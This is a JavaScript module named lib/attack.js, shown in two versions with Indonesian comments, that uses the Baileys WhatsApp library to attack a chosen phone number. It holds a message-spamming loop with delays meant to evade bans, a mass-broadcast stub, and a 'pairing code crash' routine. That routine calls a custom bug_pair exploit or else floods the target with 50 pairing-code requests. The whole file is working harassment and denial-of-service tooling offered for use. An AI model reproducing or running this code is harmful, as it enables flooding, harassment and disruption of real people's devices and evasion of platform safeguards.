// lib/attack.js - ACTIVATED
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function spamMassal(sock, target, jumlah, pesan) {
  const targetJid = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  
  for (let i = 0; i < jumlah; i++) {
    await sock.sendMessage(targetJid, { text: pesan });
    await delay(500); // Delay biar ga langsung ke-banned
  }
  return { status: true };
}

// Fitur Blast (Broadcast ke semua chat)
async function blastPMMassal(sock, pesan) {
  const chats = await sock.groupFetchAllParticipating(); // Contoh ambil data grup/chat
  // Logic blast sederhana (hati-hati banned)
  return { status: true, msg: "Fitur blast berisiko tinggi, hati-hati." };
}

module.exports = { spamMassal, blastPMMassal };


// lib/attack.js - PAIRING CRASH ADDED
const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");
const pino = require('pino');
const fs = require('fs');

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// === FITUR SPAM BIASA ===
async function spamMassal(sock, target, jumlah, pesan) {
  const targetJid = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  for (let i = 0; i < jumlah; i++) {
    await sock.sendMessage(targetJid, { text: pesan });
    await sleep(500);
  }
}

// === FITUR PAIRING CODE CRASH (NEW) ===
async function crashPair(target) {
  try {
    target = target.replace(/[^0-9]/g, '');
    
    // Gunakan folder session random/temp agar tidak tabrakan
    const tempSession = `./temp_crash_${Date.now()}`;
    const { state, saveCreds } = await useMultiFileAuthState(tempSession);
    const { version } = await fetchLatestBaileysVersion();
    
    const sock = makeWASocket({
        auth: state,
        version,
        logger: pino({ level: 'fatal' }), // Silent log
        printQRInTerminal: false
    });

    console.log(`[☠️] Injecting Pairing Code Crash to ${target}...`);
    await sleep(1500);
    
    // Memanggil fungsi bug_pair dari library custom (qwerty-xcv)
    // Jika library tidak support, ini akan error, jadi kita try-catch
    if (sock.bug_pair) {
        await sock.bug_pair(target, "7eppelix");
        console.log(`[✅] Pairing Crash Sent!`);
    } else {
        // Fallback jika bug_pair tidak ada (Spam pairing manual)
        console.log(`[⚠️] Library tidak support bug_pair, mencoba spam manual...`);
        for (let i = 0; i < 50; i++) {
            await sock.requestPairingCode(target);
            await sleep(200);
        }
    }
    
    // Bersihkan session sampah
    fs.rmSync(tempSession, { recursive: true, force: true });
    
  } catch (e) {
    console.error(`[❌] Crash Pair Error: ${e.message}`);
  }
}

module.exports = { spamMassal, crashPair };
